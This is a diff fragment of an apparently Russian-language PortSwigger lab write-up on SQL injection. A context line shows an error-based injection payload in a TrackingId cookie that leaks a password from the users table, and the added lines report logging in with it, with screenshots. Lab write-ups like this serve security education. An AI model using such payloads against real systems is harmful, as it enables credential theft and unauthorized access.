@@ -44,3 +44,12 @@ Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 
 ![PortSwigger](../Drawing/Drawing_32.png)
+
+
+Попытаемся авторризоваться:
+
+![PortSwigger](../Drawing/Drawing_33.png)
+
+![PortSwigger](../Drawing/Drawing_34.png)
+
+Успех!
